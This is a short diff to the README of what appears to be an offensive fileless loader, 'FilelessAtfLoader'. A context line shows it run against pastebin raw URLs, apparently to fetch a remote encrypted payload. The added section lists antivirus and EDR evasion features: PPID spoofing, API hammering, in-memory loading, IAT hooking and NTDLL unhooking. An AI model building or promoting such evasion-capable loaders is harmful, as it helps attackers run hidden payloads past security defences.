@@ -160,6 +160,14 @@ FilelessAtfLoader.exe https://pastebin.com/raw/cipher_b64 https://pastebin.com/r
 
 ---
 
+## Evasion methods implemented
+
+- ✓ PPID Spoofing vers explorer.exe"
+- ✓ API Hammering"
+- ✓ Fileless memory loading"
+- ✓ IAT hooking for masquing"
+- ✓ NTDLL unhooking"
+
 ## **Automatic encryption detection**
 
 FilelessAtfLoader automatically detects the encryption type:
